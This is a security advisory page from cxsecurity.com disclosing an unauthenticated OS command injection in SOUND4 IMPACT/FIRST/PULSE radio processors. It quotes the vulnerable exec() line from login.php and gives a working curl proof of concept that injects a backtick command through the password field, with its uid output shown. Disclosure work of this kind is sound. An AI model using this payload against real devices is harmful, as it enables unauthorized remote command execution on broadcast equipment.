---
title: SOUND4 IMPACT/FIRST/PULSE/Eco v2.x Remote Command Execution (RCE)
url: https://cxsecurity.com/issue/WLB-2023040015
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-04
fetch_date: 2025-10-04T11:29:45.290279
---

# SOUND4 IMPACT/FIRST/PULSE/Eco v2.x Remote Command Execution (RCE)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **SOUND4 IMPACT/FIRST/PULSE/Eco v2.x Remote Command Execution (RCE)** **2023.04.03**  Credit:  **[LiquidWorm](https://cxsecurity.com/author/LiquidWorm/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

# Exploit Title: SOUND4 IMPACT/FIRST/PULSE/Eco v2.x - Remote Command Execution (RCE)
# Exploit Author: LiquidWorm
Vendor: SOUND4 Ltd.
Product web page: https://www.sound4.com | https://www.sound4.biz
Affected version: FM/HD Radio Processing:
Impact/Pulse/First (Version 2: 1.1/2.15)
Impact/Pulse/First (Version 1: 2.1/1.69)
Impact/Pulse Eco 1.16
Voice Processing:
BigVoice4 1.2
BigVoice2 1.30
Web-Audio Streaming:
Stream 1.1/2.4.29
Watermarking:
WM2 (Kantar Media) 1.11
Summary: The SOUND4 IMPACT introduces an innovative process - mono and
stereo parts of the signal are processed separately to obtain perfect
consistency in terms of both sound and level. Therefore, in moving
reception, when the FM receiver switches from stereo to mono and back to
stereo, the sound variations and changes in level are reduced by over 90%.
In the SOUND4 IMPACT processing chain, the stereo expander can be used
substantially without any limitations.
With its advanced functionalities and impressive versatility, SOUND4
PULSE gives clients the ultimate price - performance ratio, providing
much more than just a processor. Flexible and powerful, it ensures perfect
sound quality and full compatibility with radio broadcasting standards
and can be used simultaneously for FM and HD, DAB, DRM or streaming.
SOUND4 FIRST provides all the most important functionalities you need
in an FM/HD processor and sets the bar high both in terms of performance
and affordability. Designed to deliver a sound of uncompromising quality,
this tool gives you 2-band processing, a digital stereo generator and an
IMPACT Clipper.
Desc: The application suffers from an unauthenticated OS command injection
vulnerability. This can be exploited to inject and execute arbitrary shell
commands through the 'password' HTTP POST parameter through index.php and
login.php script.
========================================================================
/var/www/login.php:
-------------------
09: if (isset($\_POST['username']) && isset($\_POST['password'])) {
10:
11: $ret = -1;
12: // remarque: Check Password for broken, only admin/admin as valid user/password
13: exec('echo ' . $\_POST['password'] . ' | /opt/sound4/sound4server \_check\_pwd\_ ' .'"'.$\_POST['username'].'";',$out,$ret);
========================================================================
Tested on: Apache/2.4.25 (Unix)
OpenSSL/1.0.2k
PHP/7.1.1
GNU/Linux 5.10.43 (armv7l)
GNU/Linux 4.9.228 (armv7l)
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
Macedonian Information Security Research and Development Laboratory
Zero Science Lab - https://www.zeroscience.mk - @zeroscience
Advisory ID: ZSL-2022-5738
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2022-5738.php
26.09.2022
--
> curl --fail -XPOST -sko nul https://RADIOGUGU/index.php --data "username=ZSL&password=`id>/var/www/g`" && curl -sk https://RADIOGUGU/g
uid=33(www-data) gid=33(www-data) groups=29(audio),33(www-data)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040015)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top